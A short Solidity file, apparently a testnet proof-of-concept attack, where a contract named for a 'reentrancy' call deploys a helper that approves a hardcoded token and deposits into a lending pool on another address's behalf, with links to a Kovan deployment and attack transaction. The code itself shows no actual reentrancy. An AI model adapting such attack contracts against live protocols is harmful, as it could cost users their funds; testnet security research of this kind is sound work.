pragma solidity 0.6.12;

// Deployed at https://kovan.etherscan.io/address/0x19e23560bfe7ee15e4c674c9b3b84722b2ed4eb1
// Attack Transaction at https://kovan.etherscan.io/tx/0xb99b83cb584bb964c10ece6bd9a4505418c0e700192e24839fa9829993425138

interface IERC20 {
    function approve(address spender, uint256 amount) external;
}

interface LendingPool {
    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;
}

contract CallerContract {
    function approveToken() external {
        IERC20(0xe22da380ee6B445bb8273C81944ADEB6E8450422).approve(
            0x3526a2fe5dA32d0f0814086848628bF12A1E4417,
            10000000
        );
    }

    function callLendingPool() external {
        LendingPool(0x3526a2fe5dA32d0f0814086848628bF12A1E4417).deposit(
            0xe22da380ee6B445bb8273C81944ADEB6E8450422,
            1,
            0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C,
            0
        );
    }
}

contract ReeterancyCallForLendingPool {
    function attack() external {
        CallerContract callerContract = new CallerContract();
        callerContract.approveToken();
        callerContract.callLendingPool();
    }
}